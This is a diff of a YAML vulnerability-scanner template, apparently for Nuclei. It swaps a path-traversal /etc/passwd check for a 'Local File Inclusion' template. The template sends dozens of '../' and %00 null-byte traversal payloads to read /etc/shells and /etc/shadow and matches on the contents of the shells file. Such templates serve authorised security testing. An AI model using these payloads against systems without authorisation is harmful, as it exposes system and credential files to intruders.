@@ -1,18 +1,70 @@
-template:
-   name: path-traversal
-   severity: high
-   author: zoidsec
-   description: Path Traversal etc/passwd Disclosure
+id: LFI
 
-request:
-   payloads: 
-      - "../../../../../../etc/passwd"
-      - "../../../../../../etc/passwd%00"
-      - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-      - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+info:
+  name: Local File Inclusion
+  author: 0x71rex
+  severity: high
 
-   paths: false
-response:
-   statusCode: 200
-   patterns: 
-      - "root:x:0:0:root"
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/etc/shells'
+      - '{{BaseURL}}/etc/shadow%00'
+      - '{{BaseURL}}/etc/shells'
+      - '{{BaseURL}}/etc/shells%00'
+      - '{{BaseURL}}../etc/shells'
+      - '{{BaseURL}}../etc/shells%00'
+      - '{{BaseURL}}../../etc/shells'
+      - '{{BaseURL}}../../etc/shells%00'
+      - '{{BaseURL}}../../../etc/shells'
+      - '{{BaseURL}}../../../etc/shells%00'
+      - '{{BaseURL}}../../../../etc/shells'
+      - '{{BaseURL}}../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shells'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shells%00'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00'
+      - '{{BaseURL}}../../../../../../etc/shells&=%3C%3C%3C%3C'
+
+    matchers:
+      - type: word
+        words:
+          - "# valid login shells"
+          - "/bin/sh"
+          - "/bin/ash"
+          - "/bin/bash"
+        condition: and
+        part: body
